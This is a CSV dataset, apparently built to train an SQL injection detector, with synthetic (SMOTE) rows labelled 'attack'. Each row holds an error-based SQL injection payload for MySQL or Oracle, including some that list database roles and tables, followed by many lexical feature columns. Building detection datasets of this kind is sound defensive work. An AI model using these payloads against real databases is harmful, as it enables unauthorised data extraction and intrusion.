id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_001167,attack,error,"1'  )   as tygi where 9891  =  9891 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",nearest_attack_euclidean,R000040,1.7890268532373799,326.55696424177836,40.0,4.040437433831744,109.55696424177836,63.0,119.0,35.0,0.3354895896931193,0.19292237718586858,0.36440893468441843,0.10717909843659366,0.5569642417783602,0.44303575822163976,2.0,0.0,2.0,2.0,0.0,21.0,0.0,0.0,6.0,7.0,0.5569642417783601,0.44303575822163976,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,1.0,1.0,0.5569642417783602,0.4430357582216399,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_001168,attack,error,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'eiau'  =  'eiau",nearest_attack_euclidean,R000047,0.3567251123817181,224.3566431890303,31.0,3.840176269927472,77.0,37.0,84.6466473321426,25.7099958568877,0.34513829276083774,0.16584567314481813,0.3747705314904921,0.11424550260385202,4.0,0.0,0.0,0.0,0.0,2.0,0.0,14.709995856887701,0.0,0.0,5.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_001169,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000003,1.284406570104202,238.57896850209244,43.143276027894025,4.412766226056505,136.00586439051634,2.0,74.42982808368207,26.143276027894025,0.5688760062284453,0.008431013201542575,0.31280422882673786,0.10988875174327434,3.0,0.0,0.0,0.0,0.0,3.5716380139470116,0.0,10.0,0.0,6.571638013947012,1.0,3.5716380139470116,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.5716380139470119,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.571638013947012
SMOTE_001170,attack,error,"1""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""jzbb""  =  ""jzbb",nearest_attack_euclidean,R000050,0.5211527093451285,232.37764701628612,32.896274502714355,3.769222393537182,75.13294104885836,36.48137251357176,93.34843146471341,27.41490198914259,0.3231532102650728,0.15694894889602454,0.4018725493142482,0.11802529152465444,0.0,4.0,0.0,0.0,0.10372549728564717,1.8962745027143526,0.0,16.41490198914259,0.0,0.0,4.896274502714353,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.2074509945712946,0.0,0.0,0.10372549728564728,1.1037254972856474,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8962745027143527,0.8962745027143527,5.207450994571294
SMOTE_001171,attack,error,"1"" where 2131  =  2131 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",nearest_attack_euclidean,R000045,1.9827717102720375,348.8658717257547,34.75608551616353,3.6147867729593823,90.91455585506294,53.59761517726412,144.97565793534588,59.37804275808176,0.260680358837852,0.15358427849876016,0.4155235180070759,0.17021184465631198,0.0,2.1341282742452954,1.6219572419182346,0.0,0.0,3.0,0.0,29.24391448383647,0.0,1.1341282742452958,0.6219572419182344,24.621957241918235,0.0,1.0,0.6219572419182348,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.6219572419182346,1.0,1.0,0.3780427580817653,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_001172,attack,error,"1'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'jwbt'  =  'jwbt",nearest_attack_euclidean,R000063,0.6380995404615724,218.56325622687444,30.377089312278173,3.3936977701361015,52.546541728649075,32.62291068772183,102.43198829003994,30.961815520463624,0.24047092904226391,0.15015190619650465,0.4677876047877072,0.14158955997352424,4.0,0.0,0.0,0.0,0.7923631040927244,2.0,0.0,19.1694524163709,0.0,0.0,4.207636895907275,2.7923631040927246,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.5847262081854487,0.0,0.0,0.7923631040927244,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.377089312278173
SMOTE_001173,attack,error,"1'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   'ayqn' like 'ayqn",nearest_attack_euclidean,R000029,1.258823529944052,187.04219276874898,28.957807231251007,3.605890891747032,46.39451807812752,40.04219276874899,76.12657830624698,24.478903615625505,0.2482827650498873,0.21401251661024626,0.4067759901766627,0.1309287281632037,2.9578072312510066,0.0,0.0,0.0,0.0,1.2605481921872483,0.0,14.521096384374497,0.0,0.0,5.739451807812752,1.2605481921872483,0.7394518078127517,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.7394518078127517,0.26054819218724834,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001174,attack,error,"1'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   'adnz'  =  'adnz",nearest_attack_euclidean,R000062,0.6383635420421295,327.5330819906313,38.42744358795974,3.9472714001759512,110.0,55.0,124.96842046287283,37.56466152775846,0.33671875759389525,0.16835937879694762,0.38039312169060097,0.11452874191855617,4.0,0.0,0.0,0.0,2.0,2.0,0.0,22.564661527758464,0.0,0.0,6.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_001175,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000001,1.6858739404357614e-07,218.0,42.0,4.340822765840235,120.0,2.0,71.0,25.0,0.5504587155963303,0.009174311926605505,0.3256880733944954,0.11467889908256881,3.0,0.0,0.0,0.0,0.0,3.0,0.0,10.0,0.0,6.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_001176,attack,error,"1   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  4510  =  4510",nearest_attack_euclidean,R000015,0.4018899950285886,191.1135298047672,26.318151372790627,3.377545634819539,40.113529804767204,42.52277294081406,85.31815137279062,23.159075686395312,0.20975535667966463,0.22261408167645425,0.44645468147007766,0.12117588017380349,0.0,0.0,0.0,0.0,0.1590756863953141,2.0,0.0,16.0,0.0,0.0,4.840924313604686,2.1590756863953144,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.3181513727906287,0.0,0.0,0.15907568639531433,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.477227059185942
SMOTE_001177,attack,error,"1""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""sdvu"" like ""sdvu",nearest_attack_euclidean,R000056,1.205544894963541,224.00235623654945,32.856469646700155,3.4973731625991142,58.14353035329985,33.71293929340031,102.00235623654946,30.143530353299845,0.2595487657389226,0.15099505325706372,0.4549913644156074,0.13446481658840628,0.0,3.3576477649748835,0.4282348233500777,0.0,1.0,1.2141174116750388,0.0,19.143530353299845,0.0,0.0,4.0,2.6423522350251174,0.0,1.0,0.21411741167503892,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.21411741167503887,1.0,1.7858825883249612,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_001178,attack,error,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'dqjq'  =  'dqjq",nearest_attack_euclidean,R000022,0.7167915302810093,194.5452535625472,28.0,3.4808424643134783,46.818248812484256,35.90875593757872,85.36350237503149,26.45474643745277,0.2406749006275113,0.18452600285732162,0.43877683049713734,0.13602226601802977,3.2729952499370247,0.0,0.0,0.0,0.1817511875157436,2.0,0.0,16.0,0.0,0.0,4.818248812484256,2.1817511875157436,0.8182488124842562,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.3635023750314874,0.0,0.0,0.18175118751574382,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.545253562547231
SMOTE_001179,attack,error,"-5606   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000031,1.1069636653880404,214.61170154588115,38.43528359098019,3.76835627740046,63.0,37.0,90.74113436392076,23.870567181960386,0.2936096330839858,0.1724374035572615,0.4227687174910806,0.11118424586767214,0.0,0.43528359098019304,1.0,0.0,1.0,0.9999999999999999,0.0,16.43528359098019,0.0,0.0,3.0,3.0,0.0,0.435283590980193,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_001180,attack,error,"-5032' or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000018,0.6499424077465683,329.2220924549126,34.0,3.5170023024756887,81.77790754508736,51.11104622745632,139.7776155686408,56.55552311372816,0.24852655898750295,0.15521225195843896,0.42448396008551353,0.17177722896854453,0.7777615568640809,0.0,1.0,0.0,0.0,2.0,0.0,29.555523113728164,0.0,0.6667153294077572,0.7777615568640805,23.0,0.7777615568640809,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_001181,attack,error,"1%'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000010,0.5479762850151676,338.02798040573805,38.21911328825133,3.807214013769225,101.21911328825132,55.0,139.24709369398937,42.56177342349734,0.29949060331460736,0.16272846168193006,0.41188081232226165,0.125900122681201,4.0,0.0,0.0,0.0,2.0,2.0,0.0,25.561773423497343,2.0,0.0,6.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.2191132882513296,0.7808867117486705,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_001182,attack,error,"1""  )   as zbhs where 2017  =  2017 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",nearest_attack_euclidean,R000042,0.48276499153669167,323.5751964240517,39.91917321413506,4.019261241118189,108.4342124989454,62.353385713080456,118.11090535548561,34.67669285654023,0.33518339479807,0.1926501240232649,0.3650172729587357,0.10714920821992938,0.0,0.9191732141350565,1.838346428270113,0.0,2.0,1.9191732141350564,0.0,20.919173214135057,0.0,0.0,6.0,6.757519642405169,0.0,0.9191732141350564,0.9191732141350566,0.08082678586494352,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.9191732141350564,1.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,13.919173214135057
SMOTE_001183,attack,error,"1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000014,2.0969794005645794,209.37954024746,34.0,3.809250695892625,61.00807155104001,41.8775223597,81.62045975253999,24.873486584179997,0.29073804529022224,0.19985522682772183,0.39041665811671117,0.11899006976534476,0.6244955280599993,0.3755044719400008,2.0,0.0,0.6244955280599993,2.0,0.0,14.248991056119998,0.0,0.0,4.375504471940001,4.624495528059999,0.6244955280599991,0.3755044719400008,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.248991056119998,0.0,1.0,0.6244955280599993,0.6244955280599992,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.37550447194000086,0.37550447194000086,6.248991056119999
SMOTE_001184,attack,error,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'lkun' like 'lkun",nearest_attack_euclidean,R000054,0.7724104645058771,213.80947828104314,31.635851663590774,3.880624049785146,75.17362661745237,37.36414833640923,77.08962915897693,24.182074168204615,0.3491111953830652,0.17573709524954628,0.3614511023717879,0.11370060699560067,4.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,14.0,0.0,0.0,5.182074168204613,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.1820741682046134,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8179258317953867,0.8179258317953867,4.817925831795387
SMOTE_001185,attack,error,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'kdxg' like 'kdxg",nearest_attack_euclidean,R000025,1.0308818735118066,324.90798210918996,38.0,3.990925383083739,111.5566082291891,55.0,121.82543828108177,36.525935598919084,0.3444257179024333,0.16967128648723478,0.3737148993320145,0.11218809627831736,4.0,0.0,0.0,0.0,2.0,1.3608479427027258,0.0,22.165087656216354,0.0,0.0,6.0,4.360847942702726,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_001186,attack,error,"1'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'jwbt'  =  'jwbt",nearest_attack_euclidean,R000063,0.4714841812645716,226.6952854306484,31.0,3.40066791261663,56.16619805027297,32.470912619624556,106.34072233252562,31.717452428225265,0.2472400392877257,0.14316792328550118,0.46952477336513737,0.14006726406163578,4.0,0.0,0.0,0.0,0.9058174760750884,2.0,0.0,19.811634952150175,0.0,0.0,4.094182523924911,2.9058174760750886,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.811634952150177,0.0,0.0,0.9058174760750884,1.0,0.9058174760750884,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.09418252392491161,0.09418252392491161,6.811634952150177
SMOTE_001187,attack,error,"-4822"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""owbp""  =  ""owbp",nearest_attack_euclidean,R000038,1.5013218042883245,341.8858051686554,35.09749502976272,3.6576299175757514,93.28413518849723,49.20333996031638,140.6016699801582,58.79666003968363,0.2724032852913427,0.14411876969814272,0.41153407352635696,0.17194387148415768,0.0,2.7966600396836263,1.0,0.0,0.0,2.6991650099209066,0.0,28.601669980158185,0.0,2.0974950297627197,0.3008349900790934,23.699165009920904,0.0,0.6991650099209066,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.6991650099209066,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.699165009920907
SMOTE_001188,attack,error,1  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,nearest_attack_euclidean,R000069,0.5286781869002386,326.81098236503345,31.25871176643335,3.510516558297126,86.93030586853321,46.034847065733395,138.5871176643335,55.25871176643335,0.2661183686449056,0.14082327238124975,0.4239714517077278,0.16908690726611678,0.0,0.0,0.0,0.0,0.0,2.0,0.0,29.5174235328667,0.0,2.223864700699953,0.25871176643334914,22.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_001189,attack,error,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'swua' like 'swua",nearest_attack_euclidean,R000070,0.6492362732036464,194.58640689745306,28.58640689745308,3.5171878706123216,49.345627589812324,35.0,83.82718620509384,26.41359310254692,0.25356834861864386,0.179869832370847,0.4308123060403038,0.13574951297020538,4.0,0.0,0.0,0.0,0.0,1.4135931025469197,0.0,16.0,0.0,0.0,5.0,1.41359310254692,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001190,attack,error,"1'   )    )    as clhk where 4607  =  4607 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R000061,1.1202021287786121,291.61436491470636,40.0,4.002285974532851,107.0,43.0,106.95516992689119,34.6591949878152,0.36697080938309057,0.1474742504997467,0.36670523338788563,0.11884970672927711,0.6591949878151977,0.34080501218480247,2.0,0.0,2.0,2.0,0.0,19.659194987815198,0.0,2.0,5.0,6.0,0.6591949878151976,0.34080501218480236,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,1.0,2.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_001191,attack,error,"-6085 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000078,0.2296356162087182,330.26454837252135,33.02404985204739,3.484751754820764,79.95190029590522,51.90380059181043,142.36074778071088,56.04809970409478,0.24209511443923412,0.15717140033703308,0.43102711187004855,0.16970637335368421,0.0,0.0,1.0,0.0,0.0,2.0,0.0,30.048099704094785,0.0,0.0,0.9759501479526076,23.0,0.0,0.0,0.0,0.02404985204739253,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9759501479526076,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.02404985204739247,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
